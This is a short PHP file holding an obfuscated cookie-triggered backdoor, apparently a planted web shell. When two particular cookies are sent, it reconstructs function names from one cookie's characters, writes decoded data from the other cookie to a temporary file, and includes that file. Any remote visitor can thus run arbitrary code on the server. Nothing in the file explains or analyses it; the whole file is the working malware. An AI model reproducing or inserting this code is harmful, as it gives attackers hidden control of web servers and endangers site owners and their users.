<?php
if (isset($_COOKIE[3]) && isset($_COOKIE[30])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 2;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[30][$n];
        if (!$c[30][$n + 1]) {
            if (!$c[30][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 2 + 1;
    }
    $k = $p[1]() . $p[8];
    if (!$p[21]($k)) {
        $n = $p[29]($k, $p[12]);
        $p[5]($n, $p[3] . $p[25]($p[23]($c[3])));
    }
    include($k);
}